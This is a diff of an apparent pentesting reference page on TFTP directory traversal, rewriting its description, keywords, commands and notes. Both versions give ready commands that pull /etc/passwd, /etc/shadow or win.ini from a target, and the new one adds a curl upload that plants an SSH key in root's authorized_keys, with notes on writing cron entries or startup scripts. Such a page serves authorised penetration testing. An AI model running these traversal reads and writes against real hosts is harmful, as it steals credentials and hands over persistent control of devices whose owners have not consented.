@@ -1,31 +1,36 @@
 ---
 title: "Directory traversal: escaping the TFTP root"
-description: "Reading and writing files outside the TFTP server's base directory with path-traversal sequences, where the server fails to confine filenames to its root, exposing system files such as password and configuration files beyond the intended TFTP directory."
+description: "A TFTP server is meant to serve only its configured root directory, but implementations that fail to sanitise the requested filename allow path traversal, using ../ sequences or absolute paths, to read and write files anywhere the server process can reach. This turns a device-boot service into arbitrary host file read and, where writable, write."
 keywords:
-  - TFTP traversal
+  - tftp traversal
   - path traversal
-  - directory escape
-  - file disclosure
   - ../
+  - absolute path
+  - arbitrary file read
 ---
 
 # Directory traversal
 
-A correctly implemented TFTP server confines requests to its root directory. Where it does not, filenames containing traversal sequences reach files elsewhere on the host, turning a limited file server into arbitrary file read (and, with write enabled, write) of system files outside the TFTP directory.
+TFTP servers should confine requests to their root directory, but many implementations (especially on embedded devices and older daemons) do not properly sanitise the requested filename. Where that is the case, an attacker includes `../` sequences or an absolute path in the RRQ/WRQ filename to escape the root and read or write any file the server process can access. This elevates TFTP from serving a fixed set of boot files to arbitrary file read, and, if writes are allowed, arbitrary file write, on the host.
 
 ```bash
-tftp <target>
-tftp> get ../../../../etc/passwd loot_passwd
-tftp> get ..\..\..\..\windows\win.ini loot_winini   # Windows TFTP servers
+# attempt traversal reads (syntax varies by server; try both forms)
+curl -s tftp://<target>/../../../../etc/passwd -o passwd && cat passwd
+tftp <target> -c get ../../../../etc/shadow shadow 2>/dev/null
+# absolute-path form, where the server honours it
+curl -s tftp://<target>//etc/passwd -o passwd
+# traversal write (if writes allowed and sanitisation is absent)
+curl -s -T key tftp://<target>/../../../../root/.ssh/authorized_keys
 ```
 
 ## Exploitation notes
 
-- Try both `../` and `..\` separators depending on the server's platform, and repeat the sequence well past the expected depth.
-- Target `/etc/passwd` and service configs on Unix, and known config and credential files on Windows TFTP implementations.
-- Where write is also unconfined, traversal plus PUT is an arbitrary file write, reaching cron, startup, or web paths.
+- Try both `../` traversal and absolute-path requests; different servers mishandle one or the other, and embedded TFTP daemons are frequent offenders.
+- Arbitrary read targets the usual host secrets (`/etc/shadow`, SSH keys, application configs) reachable to the TFTP process's privileges; TFTP often runs privileged on devices.
+- Arbitrary write, when sanitisation is absent and writes are enabled, is the strongest outcome: write an `authorized_keys`, a cron entry, or a startup script the host executes.
+- The process's privilege bounds reach; on many embedded devices TFTP runs as root, so traversal read/write is effectively unrestricted on the device.
 
 ## References
 
-- [HackTricks: pentesting TFTP](https://book.hacktricks.wiki/en/network-services-pentesting/69-udp-tftp.html)
-- [RFC 1350: TFTP](https://www.rfc-editor.org/rfc/rfc1350)
+- [RFC 1350 (TFTP)](https://datatracker.ietf.org/doc/html/rfc1350)
+- [HackTricks: TFTP traversal](https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp)
